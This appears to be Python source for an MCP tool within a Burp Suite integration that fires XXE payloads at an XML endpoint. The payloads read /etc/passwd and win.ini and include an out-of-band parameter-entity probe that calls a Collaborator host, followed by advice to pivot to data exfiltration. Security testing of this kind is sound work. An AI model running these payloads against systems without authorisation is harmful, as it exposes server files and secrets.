"""test_xxe — XXE orchestrator across four injection surfaces.

  §1 Classic file-read DOCTYPE injection (file:///etc/hostname)
  §2 Parameter-entity (out-of-band data exfil via Collaborator)
  §3 SOAP-style XXE (Content-Type: text/xml + SOAPAction)
  §4 SVG / DOCX / XLSX upload variants (caller wraps; this tool emits the
     XML body for the operator to package)

No clear standalone third-party — nuclei has ~3 templates, oxml-injector
exists for office docs but no all-class scanner. Native covers the gap.
"""

from __future__ import annotations

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client

from ._send import send_probe
from burpsuite_mcp.tools.testing._verdict import make_verdict


_FILE_READ_PAYLOADS = (
    ("etc-hostname",
     '<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]>'
     '<r>&x;</r>'),
    ("etc-passwd",
     '<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
     '<r>&x;</r>'),
    ("win-ini",
     '<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
     '<r>&x;</r>'),
    ("php-base64",
     '<?xml version="1.0"?>'
     '<!DOCTYPE r ['
     '<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>'
     '<r>&x;</r>'),
    ("netdoc",
     '<?xml version="1.0"?>'
     '<!DOCTYPE r [<!ENTITY x SYSTEM "netdoc:///etc/passwd">]>'
     '<r>&x;</r>'),
)


_INDICATORS = (
    "root:x:0:0:", "root:!:0:0:", "daemon:x:1:",
    "[fonts]", "[mail]", "[boot loader]",
    "<?xml version=", "<?php",
    # Base64-encoded /etc/passwd prefix
    "cm9vdDp4OjA6MDo",
)


def _param_entity_payload(collab_url: str) -> str:
    """Out-of-band XXE via parameter entity. Server fetches our DTD, then
    the embedded entity reflects file content via DNS/HTTP back to us."""
    return (
        '<?xml version="1.0"?>'
        f'<!DOCTYPE r [<!ENTITY % ext SYSTEM "http://{collab_url}/oob.dtd"> %ext;]>'
        '<r>oob</r>'
    )


def _xinclude_payload() -> str:
    """XInclude variant — works when DOCTYPE is blocked by libxml2 hardening
    but XInclude processing is still enabled."""
    return (
        '<?xml version="1.0"?>'
        '<r xmlns:xi="http://www.w3.org/2001/XInclude">'
        '<xi:include parse="text" href="file:///etc/hostname"/>'
        '</r>'
    )


def _billion_laughs_lite() -> str:
    """Tiny billion-laughs probe (2-level only — not DoS). Used to detect
    whether entity expansion is enabled at all without overloading."""
    return (
        '<?xml version="1.0"?>'
        '<!DOCTYPE r [<!ENTITY a "loaded"><!ENTITY b "&a;&a;">]>'
        '<r>&b;</r>'
    )


async def _maybe_collab() -> str:
    try:
        r = await client.post("/api/collaborator/payload")
        if "error" not in r:
            return r.get("payload", "")
    except Exception:
        pass
    return ""


def register(mcp: FastMCP):

    @mcp.tool()
    async def test_xxe(  # cost: low (~10 requests)
        url: str,
        method: str = "POST",
        content_type: str = "application/xml",
        cookies: dict | None = None,
        bearer_token: str = "",
        use_collaborator: bool = True,
        skip_file_read: bool = False,
        skip_xinclude: bool = False,
        skip_entity_expansion: bool = False,
    ) -> dict:
        """Fire XXE payloads against an XML-accepting endpoint.

        Returns VerdictResult (W7 schema).

        Args:
            url: Endpoint that accepts XML (POST /api/v1/upload, /soap, etc.)
            method: HTTP method (default POST)
            content_type: application/xml | text/xml | application/soap+xml |
                          application/xhtml+xml — also rotated automatically.
            cookies: Session cookies
            bearer_token: Optional bearer
            use_collaborator: Include OOB XXE probe with Collaborator domain
            skip_file_read: Skip §1 classic file reads
            skip_xinclude: Skip §2 XInclude variant
            skip_entity_expansion: Skip §3 entity-expansion probe
        """
        lines = [f"test_xxe {method} {url} (Content-Type: {content_type})\n"]
        bypasses: list[str] = []

        # The Content-Type matters more than the body in many parsers — we
        # rotate through common variants on the operator-specified body.
        ct_variants = (
            content_type,
            "text/xml",
            "application/soap+xml",
            "application/xhtml+xml",
        )
        seen_ct: set[str] = set()
        rotated_cts = []
        for ct in ct_variants:
            if ct not in seen_ct:
                seen_ct.add(ct)
                rotated_cts.append(ct)

        async def _send_xml(label: str, body: str, ct: str) -> None:
            headers = {"Content-Type": ct,
                       "Accept": "application/xml, text/xml, */*"}
            if ct == "application/soap+xml":
                headers["SOAPAction"] = ""
            r = await send_probe(method, url, headers, body=body,
                                 cookies=cookies, bearer=bearer_token)
            if "error" in r:
                lines.append(f"  {label:<28} ({ct:<26}) ERROR {r['error']}")
                return
            s = r.get("status_code", 0)
            idx = r.get("history_index", -1)
            body_resp = (r.get("response_body", "") or "")
            ln = r.get("response_length", 0)

            hit = next((ind for ind in _INDICATORS
                        if ind in body_resp), None)
            marker = ""
            if hit:
                marker = f"  *** HIT: {hit!r} ***"
                bypasses.append(f"{label} ({ct}) -> {s} (#{idx}) "
                                f"indicator={hit!r}")
            lines.append(f"  {label:<28} ({ct:<26}) -> {s} ({ln}b, #{idx}){marker}")

        # §1 File-read DOCTYPE — rotate through Content-Types on the first
        # payload to find the parser, then stick with the winner for the rest.
        if not skip_file_read:
            for label, payload in _FILE_READ_PAYLOADS:
                # Use the operator-supplied Content-Type for all variants;
                # rotation only on the first payload to dodge parser pickiness.
                if label == "etc-hostname":
                    for ct in rotated_cts:
                        await _send_xml(f"§1 {label}", payload, ct)
                else:
                    await _send_xml(f"§1 {label}", payload, content_type)

        # §2 XInclude
        if not skip_xinclude:
            await _send_xml("§2 xinclude", _xinclude_payload(), content_type)

        # §3 Entity-expansion probe (2-level only — confirms parsing of entities)
        if not skip_entity_expansion:
            await _send_xml("§3 entity-expand", _billion_laughs_lite(),
                            content_type)

        # §OOB Parameter entity via Collaborator
        collab_url = ""
        if use_collaborator:
            collab_url = await _maybe_collab()
            if collab_url:
                await _send_xml("§OOB param-entity",
                                _param_entity_payload(collab_url), content_type)
                lines.append(f"\nOOB callback used: {collab_url}")
                lines.append("Run get_collaborator_interactions after 10-30s "
                             "for blind-XXE confirmation. A DNS / HTTP hit + "
                             "no inline file content = blind XXE; pivot to "
                             "OOB-DTD-staged data exfil from there.")

        lines.append("")
        if bypasses:
            lines.append(f"HITS ({len(bypasses)}):")
            for b in bypasses:
                lines.append(f"  - {b}")
            lines.append("")
            lines.append("vuln_type='xxe' severity='critical' for file-read; "
                         "'high' for parameter-entity / blind-OOB.")
        else:
            lines.append("No inline XXE indicator. If §3 entity-expand returned "
                         "'loaded' or 'loadedloaded' in the body, the parser "
                         "does process entities — try a different payload "
                         "(stateful entity, SOAP envelope, SVG upload).")

        human = "\n".join(lines)
        import re
        logger_indices = [int(m) for m in re.findall(r"#(-?\d+)", human) if int(m) >= 0][:10]
        file_read_hit = any("root:" in b or "/etc/" in b or "file:" in b for b in bypasses)
        if file_read_hit:
            verdict, confidence = "CONFIRMED", 0.9
            ev = f"XXE file-read confirmed via {len(bypasses)} payload(s)"
        elif len(bypasses) >= 1:
            verdict, confidence = "SUSPECTED", 0.6
            ev = f"XXE indicators: {bypasses[0]}"
        else:
            verdict, confidence = "FAILED", 0.1
            ev = "no inline XXE — try parameter-entity / blind OOB"

        return make_verdict(
            verdict, confidence, ev,
            vuln_type="xxe",
            logger_indices=logger_indices,
            details={
                "url": url, "content_type": content_type,
                "bypasses": bypasses,
                "file_read_hit": file_read_hit,
            },
            summary=human,
        )
